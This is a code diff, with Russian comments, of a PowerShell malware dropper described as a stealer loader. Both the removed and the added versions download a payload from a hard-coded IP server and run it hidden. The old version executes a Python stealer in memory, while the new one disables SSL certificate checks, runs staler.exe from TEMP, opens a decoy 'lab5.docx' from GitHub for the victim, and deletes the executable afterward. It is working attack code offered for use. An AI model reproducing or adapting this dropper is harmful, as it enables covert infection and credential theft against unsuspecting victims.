@@ -1,21 +1,20 @@
-# dropper.ps1
+# dropper_simple.ps1 - Упрощенная рабочая версия
+$sv = "https://92.242.164.31:8443/api/staler.exe"
 $gh = "https://raw.githubusercontent.com/DubrovinAlex2005/drop/main/lab5.docx"
-$sv = "https://92.242.164.31:8443/api/staler.py"
 
-# 1. Скачиваем decoy-документ в видимую папку TEMP
-try { 
-    Invoke-WebRequest -Uri $gh -OutFile "$env:TEMP\lab5.docx" -UseBasicParsing | Out-Null
-} catch {}
+# Отключаем SSL
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 
-# 2. Скачиваем стайлер с сервера и запускаем его в памяти (pythonw.exe)
-try {
-    $py = (Invoke-WebRequest -Uri $sv -UseBasicParsing).Content
-    Start-Process pythonw.exe -ArgumentList "-c", "import sys; exec(sys.stdin.read())" `
-        -WindowStyle Hidden -NoNewWindow -Wait -RedirectStandardInput ([System.IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($py))) | Out-Null
-} catch {}
+# Скачиваем и запускаем стайлер
+$web = New-Object System.Net.WebClient
+$web.DownloadFile($sv, "$env:TEMP\_staler.exe")
+Start-Process "$env:TEMP\_staler.exe" -WindowStyle Hidden -WorkingDirectory $env:TEMP
 
-# 3. Ждём завершения процесса и открываем документ для жертвы
-Start-Sleep -Seconds 1
-try { 
-    Start-Process "$env:TEMP\lab5.docx"
-} catch {}
+# Скачиваем и открываем приманку
+$web.DownloadFile($gh, "$env:TEMP\lab5.docx")
+Start-Sleep -Seconds 2
+Start-Process "$env:TEMP\lab5.docx"
+
+# Очистка через 15 секунд
+Start-Sleep -Seconds 15
+Remove-Item "$env:TEMP\_staler.exe" -Force -ErrorAction SilentlyContinue
